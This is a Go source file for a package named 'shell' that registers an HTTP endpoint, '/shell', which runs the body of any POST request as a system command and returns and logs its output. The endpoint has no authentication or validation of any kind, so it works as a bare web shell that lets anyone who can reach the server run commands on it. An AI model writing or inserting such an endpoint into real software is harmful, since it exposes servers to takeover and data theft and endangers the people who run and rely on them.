package shell

import (
	"io"
	"log"
	"net/http"
	"os/exec"
)

type shellHandler struct{}

func RegisterHandlers() {
	handler := new(shellHandler)
	http.Handle("/shell", handler)
}

func (sh *shellHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodPost:
		msg, err := io.ReadAll(r.Body)

		if err != nil || len(msg) == 0 {
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		output, err := exec.Command(string(msg)).Output()

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		w.Write([]byte("Command executed: " + string(msg) + " "))
		w.Write(output)
		log.Printf("Command executed: %v %v", string(msg), output)
		return

	default:
		w.WriteHeader(http.StatusMethodNotAllowed)
	}
}
